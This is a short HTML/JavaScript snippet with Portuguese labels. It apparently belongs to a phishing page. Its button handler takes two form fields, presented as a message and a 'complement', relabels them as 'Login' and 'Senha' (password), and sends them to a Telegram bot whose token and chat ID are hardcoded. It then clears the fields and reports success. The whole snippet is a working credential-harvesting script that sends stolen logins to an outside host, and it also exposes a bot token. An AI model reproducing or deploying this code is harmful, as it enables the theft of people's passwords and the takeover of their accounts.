<script>
document.getElementById("enviarMensagem").addEventListener("click", async function() {
    const mensagem = document.getElementById("txtmessage").value.trim();
    const complemento = document.getElementById("txtcomplemento").value.trim();

    if (!mensagem) {
        alert("Digite uma mensagem antes de enviar!");
        return;
    }

    const token = "7374929625:AAFhiSSz6mgJV5H6SN1gkpd3CJATQwkE7q0";
    const chatId = "5847212672";

    const texto = `👤 Login:${mensagem}\n🔑 Senha:${complemento || "(sem complemento)"}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: texto,
                parse_mode: "Markdown"
            })
        });

        if (response.ok) {
            alert("Mensagem enviada com sucesso ✅");
            document.getElementById("txtmessage").value = "";
            document.getElementById("txtcomplemento").value = "";
        } else {
            alert("❌ Erro ao enviar a mensagem!");
        }
    } catch (error) {
        console.error(error);
        alert("❌ Falha na conexão com o Telegram!");
    }
});
</script>
